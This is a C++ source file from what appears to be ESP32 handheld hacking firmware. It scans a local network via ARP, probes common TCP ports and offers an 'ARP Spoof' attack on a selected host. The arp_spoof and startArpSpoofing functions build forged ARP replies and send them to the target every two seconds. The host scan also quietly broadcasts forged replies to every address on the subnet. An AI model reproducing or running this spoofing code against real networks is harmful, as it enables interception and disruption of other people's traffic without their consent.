#include "globals.h"
#include "lwip/etharp.h"
#include "scan_hosts.h"
#include "display.h"
#include "mykeyboard.h"
#include "wifi_common.h"
#include "clients.h"

// thx to 7h30th3r0n3, which made scanHosts faster using ARP

std::vector<IPAddress> hostslist;
IPAddress selectedIP;
uint8_t selectedMAC[6];
volatile bool stopSpoofing = false;

void read_arp_table(char *from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist) {
    Serial.printf("Reading ARP table from: %d to %d\n", read_from, read_to);

    // Obter o IP e o MAC do próprio dispositivo
    IPAddress ownIP = WiFi.localIP();
    uint8_t ownMAC[6];
    esp_read_mac(ownMAC, ESP_MAC_WIFI_STA);

    // Exibir o IP e o MAC do próprio dispositivo
    tft.setTextSize(0.2);
    tft.setTextColor(TFT_PURPLE, TFT_BLACK);

    tft.setCursor(7, 8);
    tft.print("IP: ");
    tft.println(ownIP.toString());

    tft.setCursor(7, 17);
    tft.print("MAC: ");
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
               ownMAC[0], ownMAC[1], ownMAC[2],
               ownMAC[3], ownMAC[4], ownMAC[5]);

    // Processar a tabela ARP para encontrar hosts
    for (int i = read_from; i <= read_to; i++) {
        char test[32];
        sprintf(test, "%s%d", from_ip, i);
        ip4_addr_t test_ip;
        ipaddr_aton(test, (ip_addr_t*)&test_ip);

        const ip4_addr_t *ipaddr_ret = NULL;
        struct eth_addr *eth_ret = NULL;
        if (etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0) {
            IPAddress foundIP;
            foundIP.fromString(ipaddr_ntoa((ip_addr_t*)&test_ip));
            hostslist.push_back(foundIP);

            String result = foundIP.toString().substring(foundIP.toString().lastIndexOf('.') - 1);
            options.push_back({result.c_str(), [=]() {
                memcpy(selectedMAC, eth_ret->addr, sizeof(selectedMAC));
                selectedIP = foundIP;
                Serial.printf("Selected IP: %s, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                    selectedIP.toString().c_str(), 
                    selectedMAC[0], selectedMAC[1], selectedMAC[2], 
                    selectedMAC[3], selectedMAC[4], selectedMAC[5]);
                afterScanOptions(foundIP);
            }});
            Serial.printf("Adding found IP: %s\n", ipaddr_ntoa((ip_addr_t*)&test_ip));
        }
    }
}

void printArpPacket(struct eth_hdr *ethhdr, struct etharp_hdr *hdr) {
    Serial.println("=== ARP Packet ===");

    // Ethernet header
    Serial.print("Destination MAC: ");
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        Serial.printf("%02X", ethhdr->dest.addr[i]);
    }
    Serial.println();

    Serial.print("Source MAC: ");
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        Serial.printf("%02X", ethhdr->src.addr[i]);
    }
    Serial.println();

    Serial.print("Type: ");
    Serial.printf("0x%04X", PP_HTONS(ethhdr->type));
    Serial.println();

    // ARP header
    Serial.print("Hardware type: ");
    Serial.printf("0x%04X", PP_HTONS(hdr->hwtype));
    Serial.println();

    Serial.print("Protocol type: ");
    Serial.printf("0x%04X", PP_HTONS(hdr->proto));
    Serial.println();

    Serial.print("Hardware size: ");
    Serial.printf("%u", hdr->hwlen);
    Serial.println();

    Serial.print("Protocol size: ");
    Serial.printf("%u", hdr->protolen);
    Serial.println();

    Serial.print("Opcode: ");
    Serial.printf("0x%04X", PP_HTONS(hdr->opcode));
    Serial.println();

    Serial.print("Sender MAC: ");
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        Serial.printf("%02X", hdr->shwaddr.addr[i]);
    }
    Serial.println();

    Serial.print("Sender IP: ");
    Serial.println(ip4addr_ntoa((const ip4_addr_t *)&hdr->sipaddr));

    Serial.print("Target MAC: ");
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        Serial.printf("%02X", hdr->dhwaddr.addr[i]);
    }
    Serial.println();

    Serial.print("Target IP: ");
    Serial.println(ip4addr_ntoa((const ip4_addr_t *)&hdr->dipaddr));

    Serial.println("==================");
}

void arp_spoof(IPAddress target_ip, IPAddress spoof_ip, const uint8_t *target_mac, struct netif *netif) {
    Serial.println("Preparing ARP packet");
    struct pbuf *p;
    struct eth_hdr *ethhdr;
    struct etharp_hdr *hdr;

    p = pbuf_alloc(PBUF_LINK, SIZEOF_ETHARP_HDR + PBUF_LINK_HLEN, PBUF_RAM);
    if (p != NULL) {
        ethhdr = (struct eth_hdr *)p->payload;
        hdr = (struct etharp_hdr *)((u8_t*)ethhdr + SIZEOF_ETH_HDR);

        ethhdr->type = PP_HTONS(ETHTYPE_ARP);
        SMEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN);
        SMEMCPY(ethhdr->src.addr, netif->hwaddr, ETH_HWADDR_LEN);

        hdr->hwtype = PP_HTONS(1); 
        hdr->proto = PP_HTONS(ETHTYPE_IP);
        hdr->hwlen = ETH_HWADDR_LEN;
        hdr->protolen = sizeof(ip4_addr_t);
        hdr->opcode = PP_HTONS(ARP_REPLY);

        // Definir IP e MAC do remetente (spoof_ip e MAC do próprio dispositivo)
        ip_addr_t spoof_ip_addr;
        ipaddr_aton(spoof_ip.toString().c_str(), &spoof_ip_addr);
        SMEMCPY(&hdr->shwaddr, netif->hwaddr, ETH_HWADDR_LEN);
        SMEMCPY(&hdr->sipaddr, &spoof_ip_addr, sizeof(ip4_addr_t));

        // Definir IP e MAC do destinatário (target_ip e MAC do alvo)
        ip_addr_t target_ip_addr;
        ipaddr_aton(target_ip.toString().c_str(), &target_ip_addr);
        SMEMCPY(&hdr->dhwaddr, target_mac, ETH_HWADDR_LEN);
        SMEMCPY(&hdr->dipaddr, &target_ip_addr, sizeof(ip4_addr_t));

        printArpPacket(ethhdr, hdr);  // Imprime o pacote ARP

        Serial.println("Sending ARP packet");
        if (netif->linkoutput(netif, p) != ERR_OK) {
            Serial.println("Error sending ARP packet");
        }
        pbuf_free(p);
    } else {
        Serial.println("Failed to allocate pbuf for ARP packet");
    }
}

void startArpSpoofing(IPAddress target_ip, const uint8_t *target_mac) {
    Serial.printf("Starting ARP spoofing: target %s\n", target_ip.toString().c_str());
    void *netif = NULL;
    if (tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif) != ESP_OK || netif == NULL) {
        Serial.println("Failed to get network interface");
        return;
    }
    struct netif *netif_interface = (struct netif *)netif;

    IPAddress spoof_ip = WiFi.localIP(); // Usar o IP do próprio dispositivo como spoof_ip

    tft.setTextSize(2);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(0, 0);
    tft.println("Spoofing...");
    
    tft.setCursor(0, 20);
    tft.printf("Target IP: %s", target_ip.toString().c_str());

    tft.setCursor(0, 40);
    tft.printf("Target MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
               target_mac[0], target_mac[1], target_mac[2], 
               target_mac[3], target_mac[4], target_mac[5]);

    while (!stopSpoofing) {
        arp_spoof(target_ip, spoof_ip, target_mac, netif_interface);
        delay(2000); // Envia o pacote ARP a cada 2 segundos
        if (checkSelPress()) { // Verifica se o botão de seleção foi pressionado
            stopSpoofing = true;
        }
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.println("Spoofing Stopped");
    Serial.println("ARP spoofing stopped");
}

void send_arp(char *from_ip, std::vector<IPAddress>& hostslist) {
    Serial.println("Sending ARP requests to the whole network");
    const TickType_t xDelay = (10) / portTICK_PERIOD_MS;
    void *netif = NULL;
    if (tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif) != ESP_OK || netif == NULL) {
        Serial.println("Failed to get network interface");
        return;
    }
    struct netif *netif_interface = (struct netif *)netif;

    IPAddress spoof_ip = WiFi.localIP();
    uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // MAC de broadcast

    for (char i = 1; i < 254; i++) {
        char test[32];
        sprintf(test, "%s%d", from_ip, i);
        IPAddress target_ip;
        target_ip.fromString(test);

        // Enviar requisição ARP
        ip4_addr_t test_ip;
        ipaddr_aton(test, (ip_addr_t*)&test_ip);
        int8_t arp_request_ret = etharp_request(netif_interface, &test_ip);

        // Enviar resposta ARP falsificada
         arp_spoof(target_ip, spoof_ip, target_mac, netif_interface);

        // delay(200);

        vTaskDelay(xDelay);
    }

    // Ler todas as entradas da tabela ARP
    read_arp_table(from_ip, 1, 254, hostslist);
}

void logARPResult(IPAddress host, bool responded) {
    char buffer[64];
    if (responded) {
        sprintf(buffer, "Host %s respond to ARP.", host.toString().c_str());
    } else {
        sprintf(buffer, "Host %s did not respond to ARP.", host.toString().c_str());
    }
    Serial.println(buffer);
}

bool arpRequest(IPAddress host) {
    char ipStr[16];
    sprintf(ipStr, "%s", host.toString().c_str());
    ip4_addr_t test_ip;
    ipaddr_aton(ipStr, (ip_addr_t*)&test_ip);

    struct eth_addr *eth_ret = NULL;
    const ip4_addr_t *ipaddr_ret = NULL;
    bool responded = etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0;
    logARPResult(host, responded);
    return responded;
}

void local_scan_setup() {
    if (!wifiConnected) wifiConnectMenu(false);

    int lastDot = WiFi.localIP().toString().lastIndexOf('.');
    String networkRange = WiFi.localIP().toString().substring(0, lastDot + 1);
    char networkRangeChar[12];

    networkRange.toCharArray(networkRangeChar, sizeof(networkRangeChar));

    send_arp(networkRangeChar, hostslist);

    options = {};

    IPAddress gatewayIP;
    IPAddress subnetMask;
    std::vector<IPAddress> hostslist;

    gatewayIP = WiFi.gatewayIP();
    subnetMask = WiFi.subnetMask();

    IPAddress network = WiFi.localIP();
    network[3] = 0;

    int numHosts = 254 - subnetMask[3];

    displayRedStripe("Probing " + String(numHosts) + " hosts", TFT_WHITE, FGCOLOR);

    bool foundHosts = false;
    bool stopScan = false;

    char base_ip[16];
    sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

    send_arp(base_ip, hostslist);

    for (int i = 1; i <= numHosts; i++) {
        if (stopScan) {
            break;
        }

        IPAddress currentIP = network;
        currentIP[3] = i;

        if (arpRequest(currentIP)) {
            hostslist.push_back(currentIP);
            foundHosts = true;
        }
    }

    if (!foundHosts) {
        tft.println("No hosts found");
        delay(2000);
        return;
    }

    delay(200);
    loopOptions(options);
    delay(200);
}

void afterScanOptions(IPAddress ip) {
    std::vector<std::pair<std::string, std::function<void()>>> option = {
        {"Scan Ports", [=]() { scanPorts(ip); }},
    #ifndef STICK_C_PLUS
        {"SSH Connect", [=]() { ssh_setup(ip.toString()); }},
    #endif
        {"ARP Spoof", [=]() { 
            stopSpoofing = false; 
            startArpSpoofing(ip, selectedMAC); 
        }}
    };
    loopOptions(option);
    delay(200);
}

void scanPorts(IPAddress host) {
    WiFiClient client;
    const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 3389, 8080, 8443, 9090};
    const int numPorts = sizeof(ports) / sizeof(ports[0]);
    drawMainBorder();
    tft.setTextSize(FP);
    tft.setCursor(8, 30);
    tft.print("Host: " + host.toString());
    tft.setCursor(8, 42);
    tft.print("Ports Opened: ");
    for (int i = 0; i < numPorts; i++) {
        int port = ports[i];
        if (client.connect(host, port)) {
            if (tft.getCursorX() > (240 - LW * 4)) tft.setCursor(7, tft.getCursorY() + LH);
            tft.print(port);
            tft.print(", ");
            client.stop();
        } else tft.print(".");
    }
    tft.setCursor(8, tft.getCursorY() + 16);
    tft.print("Done!");

    while (checkSelPress()) yield();
    while (!checkSelPress()) yield();
}
